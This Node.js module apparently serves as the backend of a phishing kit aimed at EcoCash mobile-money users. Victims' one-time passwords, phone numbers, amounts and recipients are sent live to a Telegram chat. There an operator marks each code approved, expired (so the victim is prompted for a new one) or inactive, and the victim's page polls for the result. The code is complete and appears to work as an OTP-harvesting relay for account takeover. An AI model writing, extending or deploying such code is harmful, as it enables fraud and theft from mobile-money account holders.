// telegram-ecocash.js
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const pending   = new Map(); // ref -> { decision, messageId }
const decisions = new Map(); // ref -> 'pending' | 'approved' | 'expired' | 'inactive'

function log(m) { console.log('[tg-eco]', m); }

async function sendTelegramMessage(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error('Telegram not configured.');
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
  return data.result;
}

async function answerCallback(cqId, text) {
  if (!BOT_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: cqId, text, show_alert: false })
  }).catch(() => {});
}

async function clearButtons(messageId) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      message_id: messageId,
      reply_markup: { inline_keyboard: [] }
    })
  }).catch(() => {});
}

function escapeHtml(v) {
  return String(v == null ? '—' : v)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function handleUpdate(update) {
  const cq = update && update.callback_query;
  if (!cq) return;
  const data = cq.data || '';
  const [action, ref] = data.split(':');
  if (!action || !ref) return;
  if (!action.startsWith('eco_')) return;

  const target =
    action === 'eco_approve'  ? 'approved' :
    action === 'eco_expired'  ? 'expired'  :
                                'inactive';

  decisions.set(ref, target);
  const e = pending.get(ref);
  if (e) e.decision = target;

  const msgs = {
    approved: '✅ Approved — client continues.',
    expired:  '⏱ Code expired — client told to resend.',
    inactive: '⚠ Inactive — client sent to inactive page.'
  };
  await answerCallback(cq.id, msgs[target] || 'Done.');
  log(`otp ${ref} → ${target}${e ? '' : ' (recovered)'}`);

  const mid = cq.message && cq.message.message_id;
  if (mid) await clearButtons(mid);
}

function registerRoutes(app) {
  // Request OTP (also used for resend)
  app.post('/api/ecocash/otp', (req, res) => {
    const { tx, am, cur, c } = req.body || {};
    sendTelegramMessage(
      `<b>🔁 EcoCash OTP requested</b>\n\n` +
      `<b>Reference:</b> <code>${escapeHtml(tx)}</code>\n` +
      `<b>Amount:</b> ${escapeHtml(cur)} ${escapeHtml(am)}\n` +
      `<b>Country:</b> ${escapeHtml(c)}`,
      null
    ).catch(() => {});
    res.json({ ok: true });
  });

  // Submit OTP → Telegram with 3 buttons
  app.post('/api/ecocash/submit', async (req, res) => {
    try {
      const { tx, otp, am, cur, c, an, rn } = req.body || {};
      if (!tx || !otp) return res.status(400).json({ error: 'Missing tx or otp' });

      const existing = pending.get(tx);
      if (existing && existing.decision === 'pending') {
        return res.json({ ok: true, requestId: tx });
      }

      pending.set(tx, { decision: 'pending', messageId: null });
      decisions.set(tx, 'pending');

      const text =
        `<b>🔐 New EcoCash OTP submitted</b>\n\n` +
        `<b>Reference:</b> <code>${escapeHtml(tx)}</code>\n` +
        `<b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
        `<b>Amount:</b> ${escapeHtml(cur)} ${escapeHtml(am)}\n` +
        `<b>Country:</b> ${escapeHtml(c)}` +
        (an ? `\n<b>Number:</b> ${escapeHtml(an)}` : '') +
        (rn ? `\n<b>Recipient:</b> ${escapeHtml(rn)}` : '');

      const keyboard = [[
        { text: '✅ Approve',     callback_data: `eco_approve:${tx}` },
        { text: '⏱ Code expired', callback_data: `eco_expired:${tx}` },
        { text: '⚠ Inactive',     callback_data: `eco_inactive:${tx}` }
      ]];

      const sent = await sendTelegramMessage(text, keyboard);
      const e = pending.get(tx);
      if (e) e.messageId = sent.message_id;

      log(`OTP submitted for ${tx}`);
      res.json({ ok: true, requestId: tx });
    } catch (err) {
      console.error('[tg-eco] submit error', err);
      res.status(500).json({ error: 'Telegram send failed' });
    }
  });

  // Poll decision
  app.get('/api/ecocash/status/:ref', (req, res) => {
    const ref = req.params.ref;
    const live = pending.get(ref);
    if (live && live.decision !== 'pending') return res.json({ decision: live.decision });
    const stored = decisions.get(ref);
    if (stored) return res.json({ decision: stored });
    res.json({ decision: 'pending' });
  });

  log('Routes: /api/ecocash/otp, /api/ecocash/submit, /api/ecocash/status/:ref');
}

module.exports = { registerRoutes, handleUpdate };
